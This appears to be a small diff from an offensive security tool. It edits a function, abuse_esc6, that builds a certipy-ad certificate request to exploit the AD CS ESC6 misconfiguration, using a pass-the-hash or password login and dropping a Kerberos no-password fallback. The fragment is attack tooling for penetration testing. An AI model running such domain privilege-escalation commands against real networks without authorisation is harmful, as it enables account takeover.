@@ -30,8 +30,6 @@ def abuse_esc6(session, template):
         auth = f"-u {session.username} -hashes :{session.hash}"
     elif session.password:
         auth = f"-u {session.username} -p '{session.password}'"
-    else:
-        auth = f"-u {session.username} -k --no-pass"
 
     cmd = (
         f"certipy-ad req {auth} "
